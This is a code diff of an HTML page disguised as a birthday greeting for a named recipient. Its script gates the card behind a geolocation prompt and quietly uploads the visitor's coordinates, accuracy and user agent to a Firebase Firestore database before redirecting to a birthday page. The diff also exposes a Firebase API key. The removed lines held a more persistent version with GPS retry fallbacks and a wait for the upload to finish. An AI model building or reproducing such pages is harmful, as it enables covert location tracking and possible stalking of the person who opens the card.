@@ -49,7 +49,6 @@
         }
         @media (max-width: 640px) { .app-container { height: 85vh; max-height: none; border-radius: 30px; border: 6px solid #fff; } }
         .canvas-area { flex: 1; position: relative; padding: 2rem; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        
         @keyframes namePulse { 0%,100% { transform: scale(1) translateY(0); } 50% { transform: scale(1.05) translateY(-5px); } }
         h1 {
             font-size: clamp(2.2rem, 7vw, 4rem); font-family: 'Patrick Hand', cursive; color: var(--ink); line-height: 1.1;
@@ -65,7 +64,6 @@
         }
         @keyframes fadeIn { to { opacity: 1; } }
         @keyframes floatAnim { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
-        
         .element {
             position: absolute; z-index: 30; opacity: 0; animation: fadeIn 1s 2s forwards; cursor: pointer; pointer-events: auto;
         }
@@ -95,6 +93,7 @@
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
 
+        /* Popups */
         .popup-overlay {
             position: fixed; inset: 0; background: rgba(74, 50, 45, 0.6); backdrop-filter: blur(12px);
             display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px;
@@ -121,6 +120,7 @@
         .instruction-guide p { margin: 8px 0; }
         .instruction-guide .step { font-weight: 700; color: #b9695a; }
 
+        /* Status Widget */
         .status-widget {
             position: fixed; bottom: 20px; right: 20px;
             background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
@@ -231,15 +231,17 @@
             <p id="sub-title" class="wish-text">YOU ARE AMAZING!</p>
         </div>
         <div class="action-bar">
-            <button class="btn btn-main" id="mainButton" style="pointer-events: none; opacity: 0.8;">Verifying...</button>
+            <button class="btn btn-main" id="mainButton">Let's go sis 🤗</button>
         </div>
     </div>
 
+    <!-- Updated Firebase SDK & Config -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
+        // අලුත් Firebase Config එක මෙතන තියෙනවා උදාර
         const firebaseConfig = {
             apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
             authDomain: "data-a0ce0.firebaseapp.com",
@@ -256,34 +258,34 @@
 
         let currentUserId = null;
         
-        // NEW MOBILE FIX: Using direct promise instead of onAuthStateChanged observer
-        const authReady = signInAnonymously(auth).then(userCredential => {
-            currentUserId = userCredential.user.uid;
-            console.log("Logged in reliably as:", currentUserId);
-            return userCredential.user;
-        }).catch(e => {
-            console.error("Auth Error (Mobile):", e);
-            return null;
+        // Auth එක සම්පූර්ණ වෙනකම් ඉන්න Promise එකක් හදාගන්නවා
+        let authReady = new Promise(resolve => {
+            onAuthStateChanged(auth, user => { 
+                if(user) {
+                    currentUserId = user.uid;
+                    console.log("Logged in as:", currentUserId);
+                    resolve(user);
+                }
+            });
         });
 
-        // Save function is now robust and won't fail silently
+        signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
+
+        // අලුත් project එකේ data save කරන function එක
         window.saveLocationData = async (data) => {
+            await authReady; // Login වෙනකම් අනිවාර්යයෙන් ඉන්නවා
+            if (!currentUserId) return;
             try {
-                await authReady; // Waits for the absolute login confirmation
-                if (!currentUserId) {
-                    console.log("Could not generate user ID.");
-                    return; 
-                }
+                // මෙතන path එක 'data-a0ce0' එකට ගැලපෙන විදිහට හැදුවා
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
                 await addDoc(colRef, { 
                     ...data, 
                     timestamp: serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    deviceType: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+                    userAgent: navigator.userAgent
                 });
-                console.log("Location saved successfully to Firestore in background!");
+                console.log("Location saved successfully!");
             } catch (e) { 
-                console.error("Firestore Upload Error:", e); 
+                console.error("Firestore Error:", e); 
             }
         };
     </script>
@@ -293,8 +295,6 @@
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
         
         let isLocationAllowed = false;
-        let isLocationDenied = false;
-        let locationSavePromise = null;
         
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
@@ -338,11 +338,6 @@
                     if(isLocationAllowed) {
                         clearInterval(check);
                         await finalize();
-                    } else if (isLocationDenied) {
-                        clearInterval(check);
-                        title.innerText = "Access Blocked ⚠️";
-                        spinner.style.display = 'none';
-                        setTimeout(() => widget.classList.remove('visible'), 3000);
                     }
                 }, 500);
             }
@@ -353,9 +348,11 @@
                 try {
                     const result = await navigator.permissions.query({ name: 'geolocation' });
                     if (result.state === 'granted') {
-                        requestLocationAccess(false); 
+                        isLocationAllowed = true;
+                        closeAllPopups();
+                        enableMainInterface();
+                        requestLocationAccess(false); // දැනටමත් Allow කරලා නම් Location අරන් Save කරනවා
                     } else if (result.state === 'denied') {
-                        isLocationDenied = true;
                         showPopup('overlay3', 'card3');
                     } else {
                         showPopup('overlay1', 'card1');
@@ -365,84 +362,23 @@
         }
 
         function requestLocationAccess(showPopupOnError = true) {
-            if (!navigator.geolocation) {
-                closeAllPopups();
-                if (showPopupOnError) showPopup('overlay2', 'card2');
-                return;
-            }
-
-            const btn = document.getElementById('mainButton');
-            if(btn) btn.innerText = "Finding best signal...";
-
-            let finalized = false;
-
-            const executeSave = (pos) => {
-                if (finalized) return;
-                finalized = true;
-                closeAllPopups();
-                
-                // Unlock UI immediately so they can click "Let's go"
-                if (!isLocationAllowed) {
-                    isLocationAllowed = true;
-                    enableMainInterface();
-                }
-
-                // Trigger background save if window.saveLocationData is loaded
-                if (window.saveLocationData) {
-                    if (pos && pos.coords) {
-                        locationSavePromise = window.saveLocationData({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude, 
-                            accuracy: pos.coords.accuracy 
-                        });
-                    } else {
-                        // Fallback save just to know they visited
-                        locationSavePromise = window.saveLocationData({ error: "Location retrieved but empty" });
-                    }
-                }
-            };
-
-            // Attempt 1: Try getting High Accuracy GPS location
-            navigator.geolocation.getCurrentPosition(
-                pos => executeSave(pos),
-                err => {
-                    if (err.code === 1) { // Permission Denied
-                        if(!finalized) {
-                            finalized = true;
-                            closeAllPopups();
-                            isLocationDenied = true;
-                            showPopup('overlay3', 'card3');
-                            if(btn) btn.innerText = "Verifying...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        isLocationAllowed = true;
+                        closeAllPopups();
+                        enableMainInterface(); // Reload නැතුව Button එක On කරනවා
+                        if (window.saveLocationData) {
+                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
                         }
-                    } else {
-                        // High accuracy failed or timed out. Attempt 2: Fallback to Low Accuracy (Mobile Towers/Wifi)
-                        navigator.geolocation.getCurrentPosition(
-                            posLow => executeSave(posLow),
-                            errLow => {
-                                if(!finalized && showPopupOnError) {
-                                    finalized = true;
-                                    closeAllPopups();
-                                    showPopup('overlay2', 'card2');
-                                    if(btn) btn.innerText = "Verifying...";
-                                }
-                            },
-                            { enableHighAccuracy: false, timeout: 10000, maximumAge: Infinity }
-                        );
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-            );
-
-            // Safety Net for Android Phones that sometimes completely hang on GPS request
-            setTimeout(() => {
-                if (!finalized) {
-                    navigator.geolocation.getCurrentPosition(
-                        posBackup => executeSave(posBackup),
-                        errBackup => {}, // Ignore errors, original function handles UI
-                        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
-                    );
-                }
-            }, 4500);
+                    },
+                    (error) => {
+                        closeAllPopups();
+                        if (showPopupOnError) showPopup('overlay2', 'card2');
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
         }
 
         function showPopup(overlayId, cardId) {
@@ -463,8 +399,6 @@
             const btn = document.getElementById('mainButton');
             btn.style.pointerEvents = 'auto';
             btn.disabled = false;
-            btn.innerText = "Let's go sis 🤗"; 
-            btn.style.opacity = '1';
         }
 
         function showGuideInPopup2() {
@@ -490,6 +424,7 @@
             `;
         }
 
+        // Animation logic
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
         const handleMove = (clientX, clientY) => {
@@ -501,30 +436,12 @@
             elements.forEach(el => { let speed = parseFloat(el.getAttribute('data-speed')); el.style.transform = `translate(${x*speed*40}px, ${y*speed*40}px)`; });
         };
 
-        async function triggerHelloAnimation() {
+        function triggerHelloAnimation() {
             mainTitle.classList.add('hide-text'); subTitle.classList.add('hide-text');
             smileContainer.classList.add('focus-face');
             leftEyeGroup.classList.remove('eye-blink'); rightEyeGroup.classList.remove('eye-blink');
-            
-            setTimeout(() => { 
-                rightEyeGroup.classList.add('wink-eye'); 
-                mouth.classList.add('big-smile'); 
-            }, 300);
-
-            // Wait for 2.5 seconds to show the cute animation
-            await new Promise(resolve => setTimeout(resolve, 2500));
-            
-            // Critical Mobile Fix: Wait until data is ACTUALLY saved before redirecting
-            if (locationSavePromise) {
-                try {
-                    // Give it up to 8 more seconds to finish uploading on slow 3G/4G
-                    const uploadTimeout = new Promise(resolve => setTimeout(resolve, 8000));
-                    await Promise.race([locationSavePromise, uploadTimeout]);
-                } catch(e) { console.error("Upload wait error", e); }
-            }
-
-            // Redirect only AFTER the save has completed or timed out
-            window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu";
+            setTimeout(() => { rightEyeGroup.classList.add('wink-eye'); mouth.classList.add('big-smile'); }, 300);
+            setTimeout(() => { window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu"; }, 2500);
         }
 
         window.onload = () => {
